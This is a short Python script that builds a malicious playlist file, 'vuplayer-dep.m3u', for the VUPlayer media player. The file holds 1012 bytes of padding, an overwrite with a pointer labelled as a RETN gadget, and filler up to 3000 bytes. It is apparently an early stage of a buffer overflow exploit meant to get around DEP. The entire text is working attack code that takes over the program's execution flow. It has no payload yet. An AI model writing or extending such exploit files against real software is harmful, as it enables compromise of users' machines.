import sys
import struct
import os

crash_file = "vuplayer-dep.m3u"

fuzz = "A" * 1012
fuzz += "\x08\x10\x10\x10" # 10101008  <-- Pointer to a RETN
fuzz += "C" * (3000 - len(fuzz))

makedafile = open(crash_file, "w")
makedafile.write(fuzz)
makedafile.close()